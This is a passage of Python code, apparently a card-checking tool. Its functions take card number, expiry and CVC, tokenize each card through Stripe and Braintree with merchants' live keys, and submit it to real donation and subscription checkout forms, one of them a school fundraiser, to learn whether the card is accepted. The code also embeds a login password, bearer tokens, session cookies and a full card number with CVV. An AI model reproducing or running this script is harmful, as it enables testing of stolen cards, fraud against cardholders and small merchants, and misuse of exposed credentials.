            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1730313434763',
	}

	data = {
            'data': '__fluent_form_embded_post_id=12456&_fluentform_24_fluentformnonce=44f2594fb3&_wp_http_referer=%2Fshop%2F&names_1%5Bfirst_name%5D=Chit&names_1%5Blast_name%5D=Nge&email=saimyataungcr8%40gmail.com&description=&address_1%5Baddress_line_1%5D=New%20York&address_1%5Baddress_line_2%5D=Chg&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&phone=15025659429&payment_input=7.50&payment_method=stripe&__entry_intermediate_hash=f0cb8218b468ba9cdcfac13da0773a43&item__24__fluent_checkme_=&payment_input_1%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '24',
	}
	
	r2 = requests.post(
			'https://keithblakemorenoble.com/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank you'
	return ii
	
import requests,re
def Tele11(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()


	headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=51793cd0-b6db-4ea6-aaee-ede1ac021a299e6275&muid=19e9917b-2c0e-4e54-b7d1-b8ba9e0c96c9fbd137&sid=690e5b7c-5b65-4a26-82dd-043872da2f568ee8e8&payment_user_agent=stripe.js%2F647211f3a5%3B+stripe-js-v3%2F647211f3a5%3B+card-element&referrer=https%3A%2F%2Fcouleechristian.org&time_on_page=53443&key=pk_live_51JdJczCSVtE2KyCSc2kk3wxMBueqYyH33x9EZdjWz8xPInYepsnrsXoDK7ImzyBNFR6gQKKNL9geLxBAIixkIbZv00FEFkki5B'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']


	cookies = {
            '_ga': 'GA1.1.638243415.1730313906',
            '_clck': '1tb5g3a%7C2%7Cfqg%7C0%7C1764',
            '_clsk': '1vvwdf5%7C1730313908351%7C1%7C1%7Ce.clarity.ms%2Fcollect',
            '__stripe_mid': '19e9917b-2c0e-4e54-b7d1-b8ba9e0c96c9fbd137',
            '__stripe_sid': '690e5b7c-5b65-4a26-82dd-043872da2f568ee8e8',
            '_ga_L94XR99Q9Y': 'GS1.1.1730313906.1.1.1730313959.0.0.0',
	}

	headers = {
            'authority': 'couleechristian.org',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.1.638243415.1730313906; _clck=1tb5g3a%7C2%7Cfqg%7C0%7C1764; _clsk=1vvwdf5%7C1730313908351%7C1%7C1%7Ce.clarity.ms%2Fcollect; __stripe_mid=19e9917b-2c0e-4e54-b7d1-b8ba9e0c96c9fbd137; __stripe_sid=690e5b7c-5b65-4a26-82dd-043872da2f568ee8e8; _ga_L94XR99Q9Y=GS1.1.1730313906.1.1.1730313959.0.0.0',
            'origin': 'https://couleechristian.org',
            'referer': 'https://couleechristian.org/autumnfundraiser-tickets/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1730313965153',
	}

	data = {
             'data': '__fluent_form_embded_post_id=3389&_fluentform_10_fluentformnonce=9ca57cdb58&_wp_http_referer=%2Fautumnfundraiser-tickets%2F&payment_input=CCS%20Staff%20Ticket&item-quantity=1&email=saimyataungcr8%40gmail.com&input_radio=I%20would%20like%20to%20be%20recognized%20on%20the%20website&description=&names%5Bfirst_name%5D=Chit&names%5Blast_name%5D=Nge&address_1%5Baddress_line_1%5D=New%20York&address_1%5Baddress_line_2%5D=Fg&address_1%5Bcity%5D=New%20York%20&address_1%5Bstate%5D=New%20York&address_1%5Bzip%5D=10080&address_1%5Bcountry%5D=US&phone=15025659429&payment_method=stripe&__entry_intermediate_hash=349f98a1f36e6c9477134d7dc739d55b&__stripe_payment_method_id='+str(pm)+'',
            'action': 'fluentform_submit',
            'form_id': '10',
	}
	
	r2 = requests.post(
			'https://couleechristian.org/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	).json()
	try:
		ii=r2['errors']
	except:
		return 'success' or 'Thank you'
	return ii
	
	
import requests
import re
import random
import time
import string
import base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
def Tele5(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''zkbzmssh%7C1722163826%7CPYyJVGful9oiz9Fk2qffCmmrLkPFHj6pjCToHoyt8r1%7Ceb9935d8bc113a5acd9c193064033918787622ca95782d6317955699be2082b0
'hdjshshsh%7C1722164162%7CTP3afdym0X81iDDxRTbRkBWLDdAKgqEKwqx6GYim365%7C424cfcf6eb45d32f11893eb98004603b447a77cee129c990e95867665537d75d
bsbsjdhhdj%7C1722164292%7CAnd5Gmo2UVNQz7IFiuuOHbcWFUoVJBk7DQtsjQS27Oa%7C6e9883df5374751c0cdc9383a751fcb80b31dfacc9e4747bbf08883e4986a7c7
jdhshsh%7C1722164426%7CQkqnUBtPMRYcYpcvKhriZedlcVJsl24RrNRohG9rVRM%7Cbb8a8b162fd95263262ae98ada998ab6063eb46e075d944fda37cffee93b343a
'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
        'prism_799560831': '456b96fa-aad6-4b72-bf00-1ed400a05b67',
        '_hjSessionUser_1370678': 'eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==',
        '_fbp': 'fb.1.1729528503090.441381019795189341',
        '_gid': 'GA1.2.1462020079.1730483498',
        '_hjSession_1370678': 'eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
        'newUser': 'j%3A%2267253fc76a88b34aed93beb1%22',
        '_hjHasCachedUserAttributes': 'true',
        '_ga': 'GA1.2.650073427.1729528251',
        '_gat_UA-124464104-1': '1',
        '_gat_UA-182261587-1': '1',
        '_ga_EJ0BHS4FHZ': 'GS1.1.1730483497.6.1.1730496294.54.0.393490397',
        'TawkConnectionTime': '0',
        'twk_uuid_5bb54fe6b033e9743d022de5': '%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496297292%7D',
	}
	
	headers = {
        'authority': 'in.flowster.app',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1950500355.1729528251; prism_799560831=456b96fa-aad6-4b72-bf00-1ed400a05b67; _hjSessionUser_1370678=eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==; _fbp=fb.1.1729528503090.441381019795189341; _gid=GA1.2.1462020079.1730483498; _hjSession_1370678=eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; newUser=j%3A%2267253fc76a88b34aed93beb1%22; _hjHasCachedUserAttributes=true; _ga=GA1.2.650073427.1729528251; _gat_UA-124464104-1=1; _gat_UA-182261587-1=1; _ga_EJ0BHS4FHZ=GS1.1.1730483497.6.1.1730496294.54.0.393490397; TawkConnectionTime=0; twk_uuid_5bb54fe6b033e9743d022de5=%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496297292%7D',
        'origin': 'https://in.flowster.app',
        'referer': 'https://in.flowster.app/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-auth': 'null',
	}
	
	json_data = {
        'email': 'minhtetxx@gmail.com',
        'password': 'Chitnge834@',
	}
	response = requests.post('https://in.flowster.app/api/login', cookies=cookies, headers=headers, json=json_data)	
    
    
	headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzA1ODI3NTQsImp0aSI6Ijk5YzQ0YTk5LTM5MTUtNDk2Ni1iYTczLTFjZjg5NmM1ZmU3ZSIsInN1YiI6IjdrOG1zdHJnN3BmeHA1ZjgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjdrOG1zdHJnN3BmeHA1ZjgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJjdXN0b21lcl9pZCI6IjU3MDk1NzU0MDk5In19.pBboGTE8q_G3qe4VccCcrLmI8nxZYOxy03YZl7-aaup3Ldi8qMueDLlAtTP1W0p5ZOqBbQbBrRvgOI7MwwQsjA?customer_id=',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
	
	
	json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'a1cea4e3-a274-4cdf-a9bd-54e60c2d7060',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': '10080',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
        '_gcl_au': '1.1.1950500355.1729528251',
        'prism_799560831': '456b96fa-aad6-4b72-bf00-1ed400a05b67',
        '_hjSessionUser_1370678': 'eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==',
        '_fbp': 'fb.1.1729528503090.441381019795189341',
        '_gid': 'GA1.2.1462020079.1730483498',
        '_hjSession_1370678': 'eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
        'newUser': 'j%3A%2267253fc76a88b34aed93beb1%22',
        '_ga': 'GA1.2.650073427.1729528251',
        'TawkConnectionTime': '0',
        'twk_uuid_5bb54fe6b033e9743d022de5': '%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496330142%7D',
        '_hjHasCachedUserAttributes': 'true',
        '_ga_EJ0BHS4FHZ': 'GS1.1.1730483497.6.1.1730496332.16.0.393490397',
	}
	
	headers = {
        'authority': 'in.flowster.app',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1950500355.1729528251; prism_799560831=456b96fa-aad6-4b72-bf00-1ed400a05b67; _hjSessionUser_1370678=eyJpZCI6ImYxYzNkZmUzLTkyYmYtNWJmOS04ODgyLTUxYzUwMGIzZWU4NiIsImNyZWF0ZWQiOjE3Mjk1MjgyNjAyODMsImV4aXN0aW5nIjp0cnVlfQ==; _fbp=fb.1.1729528503090.441381019795189341; _gid=GA1.2.1462020079.1730483498; _hjSession_1370678=eyJpZCI6IjM0MjRiMTM3LTViZDMtNDNmYi04MGU3LTI3ZjI4MmQyMzY2ZiIsImMiOjE3MzA0ODM0OTk0OTYsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; newUser=j%3A%2267253fc76a88b34aed93beb1%22; _ga=GA1.2.650073427.1729528251; TawkConnectionTime=0; twk_uuid_5bb54fe6b033e9743d022de5=%7B%22uuid%22%3A%221.SwuzFR4gjGkWunf2HDh5d7d2IXulKcGJhDN7JNMsLjWLAu8Mfv363VDebfh7HXMxwP2H1Nxqd5VQHCLWysZCWux2LATUyOP9vnbcuhmFOOfH9Cv4BCFHo%22%2C%22version%22%3A3%2C%22domain%22%3A%22flowster.app%22%2C%22ts%22%3A1730496330142%7D; _hjHasCachedUserAttributes=true; _ga_EJ0BHS4FHZ=GS1.1.1730483497.6.1.1730496332.16.0.393490397',
        'origin': 'https://in.flowster.app',
        'referer': 'https://in.flowster.app/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NzI1M2MwNTEzNmI3NGNlYWQ4MzVhOWQiLCJhY2Nlc3MiOiJhdXRoIiwiZGF0ZSI6MTczMDQ5NjMyNzg2MCwiaWF0IjoxNzMwNDk2MzI3fQ.d618FA3sUypw_-7IbFxYV2VnMt95qX7u2BKZLznIHL4',
    }	
	
	json_data = {
        'customer_ip': '129.153.8.93',
        'paymentMethodNonce': tok,
        'deviceData': '{"correlation_id":"7d4a4ac5633e6f2561650dba646a5eb5"}',
        'divisionId': '67253c146a88b34aed93b6a4',
        'plan': 'Startup',
        'planType': 'year',
        'signup': False,
        'PPTId': '62be2614f01143674e6e0d33',
        'trial': {
            'PPTId': '62be2614f01143674e6e0d33',
            'trialPeriod': True,
            'trialDuration': 7,
            'trialDurationUnit': 'day',
            'nextBillingDate': None,
            'paymentMethodRequired': True,
        },
        'browserId': '5903b0ed-3989-4db0-ac92-a34731058267',
	}
	

      	
	
	response = requests.post(
	    'https://in.flowster.app/payment/division/checkout',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	return (response.json())
